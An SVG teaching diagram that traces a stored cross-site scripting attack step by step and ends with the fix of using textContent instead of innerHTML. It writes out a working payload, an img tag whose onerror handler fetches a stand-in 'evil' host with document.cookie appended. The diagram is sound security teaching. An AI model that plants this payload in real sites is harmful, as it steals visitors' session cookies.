<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 500">
  <title>Stored XSS: the attacker's comment is saved by the site, inserted with innerHTML in every visitor's browser, and its onerror handler sends their cookies away</title>
  <style>
    text { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 18px; fill: #eeeeee; text-anchor: middle; dominant-baseline: middle; }
    .small { font-size: 15px; fill: #b0b4bc; }
    .label { font-size: 15px; fill: #b0b4bc; text-anchor: start; }
    .mono { font-family: Menlo, Consolas, "DejaVu Sans Mono", monospace; font-size: 14px; text-anchor: start; }
    .box { fill: rgba(255, 255, 255, 0.06); stroke: #cfd3da; stroke-width: 2; }
    .evil { fill: rgba(255, 82, 82, 0.10); stroke: #ff5252; stroke-width: 2; }
    .site { fill: rgba(0, 229, 255, 0.08); stroke: #00e5ff; stroke-width: 2; }
    .life { fill: none; stroke: #8d97a8; stroke-width: 2; stroke-dasharray: 4 5; }
    .line { fill: none; stroke: #cfd3da; stroke-width: 2; marker-end: url(#arrow); }
    .bad { fill: none; stroke: #ff5252; stroke-width: 2.5; marker-end: url(#red); }
    .orange { fill: #ff9100; } .green { fill: #76ff03; } .cyan { fill: #00e5ff; }
    .red { fill: #ff5252; } .violet { fill: #ee82ee; } .yellow { fill: #ffcc00; } .grey { fill: #8d97a8; }
  </style>
  <defs>
    <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#cfd3da" /></marker>
    <marker id="red" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#ff5252" /></marker>
  </defs>

  <rect class="evil" x="20" y="10" width="150" height="40" rx="6" />
  <text class="red" x="95" y="30">attacker</text>
  <rect class="site" x="250" y="10" width="170" height="40" rx="6" />
  <text class="cyan" x="335" y="30">site.example</text>
  <rect class="box" x="500" y="10" width="190" height="40" rx="6" />
  <text x="595" y="30">every visitor</text>
  <rect class="evil" x="750" y="10" width="130" height="40" rx="6" />
  <text class="red" x="815" y="30">evil</text>
  <path class="life" d="M95,52 L95,416" />
  <path class="life" d="M335,52 L335,416" />
  <path class="life" d="M595,52 L595,416" />
  <path class="life" d="M815,52 L815,416" />

  <!-- 1 post -->
  <path class="line" d="M99,90 L331,90" />
  <text class="label" x="110" y="76"><tspan class="yellow">1</tspan> post a comment</text>
  <rect x="40" y="104" width="560" height="34" rx="5" fill="#2b2b2b" />
  <rect class="evil" x="40" y="104" width="560" height="34" rx="5" />
  <text class="mono" x="52" y="122"><tspan class="red">&lt;img src=x onerror="fetch('//evil/'+document.cookie)"&gt;</tspan></text>
  <!-- 2 stored -->
  <text class="label" x="345" y="154"><tspan class="yellow">2</tspan> stored as-is</text>

  <!-- 3 visitor loads page -->
  <path class="line" d="M591,178 L339,178" />
  <text class="label" x="420" y="166" style="font-size: 14px"><tspan class="yellow">3</tspan> <tspan class="mono" style="font-size: 13px">GET /post/42</tspan></text>
  <path class="line" d="M339,208 L591,208" />
  <text class="label" x="350" y="196" style="font-size: 14px">the page and its comments</text>

  <!-- 4 innerHTML -->
  <rect x="440" y="226" width="440" height="116" rx="5" fill="#2b2b2b" />
  <rect class="box" x="440" y="226" width="440" height="116" rx="5" />
  <text class="label" x="452" y="244"><tspan class="yellow">4</tspan> in the visitor's browser</text>
  <text class="mono" x="452" y="270"><tspan class="cyan">el.innerHTML</tspan> = "&lt;p&gt;" + comment + "&lt;/p&gt;"</text>
  <text class="label" x="452" y="296" style="font-size: 14px">the comment is parsed as HTML: an &lt;img&gt; is created,</text>
  <text class="label" x="452" y="316" style="font-size: 14px"><tspan class="mono">src=x</tspan> fails to load, and <tspan class="red">onerror</tspan> runs as <tspan class="cyan">site.example</tspan></text>

  <!-- 5 exfiltrate -->
  <path class="bad" d="M599,374 L811,374" />
  <text class="label" x="610" y="360" style="font-size: 14px"><tspan class="yellow">5</tspan> <tspan class="mono" style="font-size: 13px">GET /session=…</tspan></text>
  <text class="label" x="610" y="394" style="font-size: 14px">cookies not marked HttpOnly</text>

  <text class="small" x="450" y="446" style="font-size: 14px">A <tspan class="mono" style="font-size: 13px">&lt;script&gt;</tspan> inserted with innerHTML never runs, which is why payloads use event handlers.</text>
  <text class="small" x="450" y="470" style="font-size: 14px">With <tspan class="mono green" style="font-size: 13px">el.textContent = comment</tspan> the same text is shown, and nothing runs.</text>
</svg>
